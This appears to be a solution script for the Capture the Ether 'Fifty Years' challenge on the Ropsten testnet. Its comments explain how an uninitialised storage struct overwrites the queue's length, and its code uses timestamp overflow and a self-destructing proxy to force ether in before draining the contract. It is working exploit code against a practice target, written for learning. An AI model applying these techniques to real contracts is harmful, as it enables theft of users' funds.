/**
 * INSTRUCTIONS
 *
 * 1. Deploy ProxyContract by running `(cd 6_fifty_years_ropsten && truffle migrate --reset)`
 * ^^^^ended up deploying using remix, something wrong with `6_fifty_years_ropsten` folder.^^^^
 * 2. Copy ProxyContract address to variable below
 * 3. Copy challenge contract address (from capturetheether) to variable below
 * 4. Good to go, follow the steps one by one.
 *
 * SOLUTION
 *
 * Couldn't find anything about this but it seems we just have function scope, `contribution` variable isn't scoped to condition.
 * Which is extremely odd in my opinion, perhaps later compiler versions will detect this?
 *
 * So, we use a combination of timestamp overflow and proxy contract to solve this.
 * Note that `contribution.unlockTimestamp = timestamp;` will set head variable. And
 * `queue.push(contribution)` will increment length and whatever we have in `amount`.
 *
 * We could solve this challenge by not using any Proxy contract but that would be fiddly,
 * that is, a couple of more steps involved.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");

const mnemonic = fs.readFileSync("../.secret").toString().trim();
const infuraProjectId = fs.readFileSync("../.infura").toString().trim();

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: `https://ropsten.infura.io/v3/${infuraProjectId}`,
});

const web3 = new Web3(provider);

const proxyAbi = JSON.parse(
  fs.readFileSync("./6_fifty_years_ropsten/build/contracts/ProxyContract.json")
).abi;

const challengeAbi = JSON.parse(fs.readFileSync('./abi/6_fifty_years.json'));

const challengeContractAddress = "0x4f020dD967F8eE6f3e9aeC02115007cc693b285a";
const proxyContractAddress = "0x826C8FF65a1180D796cd4C7050d27c52011514E2";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];
    const challengeContract = new web3.eth.Contract(
      challengeAbi,
      challengeContractAddress
    );
    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);
    const gasPrice = await web3.eth.getGasPrice();
    let res;

    let amountToSend = 1;     // it will set array length, but afterwards there is a push
    const indexForElseCondition = 100;
    const overflowsToZero = 2n ** 256n;
    const oneDayTimestamp = 60n * 60n * 24n;
    const oneDayOverflowDifferenceTimestamp = overflowsToZero - oneDayTimestamp;

    // STEP 1
    // res = await challengeContract.methods
    //   .upsert(indexForElseCondition, oneDayOverflowDifferenceTimestamp)
    //   .send({ from: user, gasPrice, value: amountToSend });

    const zeroTimestamp = 0;
    amountToSend = 2;           // this will effectively be the index too if we fall in the else condition

    // STEP 2
    // res = await challengeContract.methods
    //   .upsert(indexForElseCondition, zeroTimestamp)
    //   .send({ from: user, gasPrice, value: amountToSend });

    // STEP 3: use RetirementFund strategy that is, force send 2 wei to Challenge contract
    // so the sum matches the contract balance
    // res = await proxyContract.methods
    //   .destroy(challengeContractAddress)
    //   .send({ from: user, gasPrice })
    // console.log(res);

    // STEP 4: sum and balance should be the same here, widthdraw.
    const index = 2;
    res = await challengeContract.methods
      .withdraw(index)
      .send({ from: user, gasPrice });
    console.log(res);


    web3.eth.getBalance(challengeContractAddress, (_, balance) => {
      console.log(
        "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
      );
    });
  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
